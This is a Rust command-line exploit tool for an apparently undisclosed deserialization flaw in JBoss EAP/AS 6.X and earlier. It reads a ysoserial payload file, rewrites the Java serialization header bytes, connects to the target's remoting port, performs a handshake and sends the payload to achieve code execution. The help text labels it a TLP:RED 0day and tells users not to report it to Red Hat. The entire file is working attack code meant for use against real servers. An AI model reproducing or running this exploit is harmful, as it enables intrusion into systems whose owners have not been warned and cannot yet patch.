extern crate clap;

use clap::{Arg, App};

use std::net::TcpStream;
use std::io::{Read, Write};
use std::fs::File;
use std::path::Path;
use std::str::from_utf8;
use std::process::exit;

// stackoverflow FTW
// https://stackoverflow.com/questions/54150353/how-to-find-and-replace-every-matching-slice-of-bytes-with-another-slice
// this will replace all the occurrences, but in this case, \xac\xed only happens once
fn replace_slice<T>(source: &mut [T], from: &[T], to: &[T])
    where
        T: Clone + PartialEq,
{
    let iteration = if source.starts_with(from) {
        source[..from.len()].clone_from_slice(to);
        from.len()
    } else {
        1
    };

    if source.len() > from.len() {
        replace_slice(&mut source[iteration..], from, to);
    }
}

fn prepare_payload(serial_file: &str) -> Vec<u8> {
    println!("[!] Loading and preparing the payload...");

    let in_the_past = b"\xac\xed\x00\x05";
    let magic_bytes = b"\x77\x01\x16\x79";

    let mut file_content = Vec::new();
    let mut file = File::open(&serial_file).expect("[-] Unable to open file");
    file.read_to_end(&mut file_content).expect("[-] Unable to read");

    replace_slice(&mut file_content, in_the_past, magic_bytes);

    file_content
}

fn send_gift(target: &str, port: &str, payload: Vec<u8>) {

    // WTF I am doing here, converting str to str * 2??
    let mut target_address = target.to_string();
    let target_port = port.to_string();

    // target:port -> TcpStream
    target_address.push_str(":");
    target_address.push_str(&target_port);

    if let Ok(mut stream) = TcpStream::connect(target_address) {
        println!("[+] Connected to the server!");

        let handshake = b"\xac\xed\x00\x05";

        println!("[!] Sending handshake...");
        stream.write(handshake).unwrap();

        let mut data = [0 as u8; 4];
        match stream.read_exact(&mut data) {
            Ok(_) => {
                if &data == handshake {
                    println!("[+] Handshake Succeed!");
                    stream.write(payload.as_slice()).unwrap();
                    println!("[+] Exploiting... Done!");
                } else {
                    let res = from_utf8(&data).unwrap();
                    println!("[-] Unexpected response: {}", res);
                    println!("[-] Server response bytes: {:?}", res);
                }
            }
            Err(e) => {
                println!("[-] Failed to receive data: {}", e);
            }
        }
    } else {
        println!("[-] Couldn't connect to server...");
    }
}

fn main() {
    let matches = App::new("JBoss EAP/AS <= 6.X Vulnerability by @joaomatosf - A little bit beyond ACED")
        .version("1.0")
        .author("Exploit by: @jespinhara\n")
        .about("\nTLP:RED  - Not for disclosure, restricted to participants only. \n\
        This vulnerability still a 0day - DO NOT REPORT TO RED HAT! \n\
        \nThis code exploits an unsafe and unconventional deserialization affecting the\n\
        JBoss EAP/AS <= 6.X by default and  JBoss EAP/AS up to date if the targeted service is enabled.")
        .arg(Arg::with_name("target")
            .short("t")
            .long("target")
            .value_name("TARGET")
            .help("Target address")
            .takes_value(true)
            .required(true))
        .arg(Arg::with_name("port")
            .short("p")
            .long("port")
            .value_name("PORT")
            .help("Port (4446: JBoss Remoting Unified Invoker, 3873: EJB Remoting Connector)")
            .takes_value(true)
            .default_value("4446")
            .required(false))
        .arg(Arg::with_name("payload")
            .short("y")
            .long("payload")
            .value_name("PAYLOAD")
            .help("Ysoserial payload")
            .takes_value(true)
            .required(true))
        .get_matches();

    let target = matches.value_of("target").unwrap();
    let port = matches.value_of("port").unwrap();
    let payload = matches.value_of("payload").unwrap();

    if !Path::new(payload).exists() {
        println!("[-] Payload file not found! Exiting...");
        exit(0);
    }

    send_gift(target, port, prepare_payload(payload));

}